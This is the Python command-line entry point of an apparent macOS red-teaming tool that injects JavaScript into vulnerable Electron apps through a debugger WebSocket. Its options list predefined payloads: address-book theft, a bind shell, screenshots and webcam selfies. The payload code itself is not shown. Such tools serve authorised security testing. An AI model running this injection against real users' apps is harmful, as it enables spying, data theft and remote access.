import argparse
import os
import checkvulnerable
import list
import websockets
import inject


# Main command-line interface
def main():
    parser = argparse.ArgumentParser(
        description="macOS Red Teaming tool that allows code injection in Electron apps by Wojciech Reguła (@_r3ggi)")

    subparsers = parser.add_subparsers(dest='command')

    # ListApps command
    list_apps_parser = subparsers.add_parser('listapps', help='List all installed Electron apps')
    list_apps_parser.set_defaults(func=list.pretty_print_electron_apps)

    # Inject command
    inject_parser = subparsers.add_parser('inject', help='Inject code to a vulnerable Electron app')
    inject_parser.add_argument('path', help='Path to the Electron app')
    inject_parser.add_argument('--path-js', help='Path to a file containing JavaScript code to be executed',
                               default=None)
    inject_parser.add_argument('--predefined-script',
                               help='Use predefined JS scripts (calc, screenshot, stealAddressBook, bindShell, takeSelfie)',
                               default=None)
    inject_parser.set_defaults(func=inject_code)

    # Verify command
    verify_parser = subparsers.add_parser('verify', help='Verify if an Electron app is vulnerable to code injection')
    verify_parser.add_argument('path', help='Path to the Electron app')
    verify_parser.set_defaults(func=verify_vulnerability)

    args = parser.parse_args()

    if hasattr(args, 'func'):
        args.func(args)
    else:
        parser.print_help()


def inject_code(args):
    if checkvulnerable.is_vulnerable(args.path):
        if inject.can_load_web_socket_debugger_url():
            code = ''
            if args.path_js:
                with open(args.path_js, 'r') as file:
                    code = file.read()
            elif args.predefined_script:
                code = list.get_command_for_predefined_script(args.predefined_script)

            if code:
                websockets.execute_code_in_electron_app(code)


def verify_vulnerability(args):
    vulnerable = checkvulnerable.is_vulnerable(args.path)
    if vulnerable:
        print("The application is vulnerable! You can now kill the app.")
    else:
        print("The application is NOT vulnerable.")


if __name__ == "__main__":
    main()
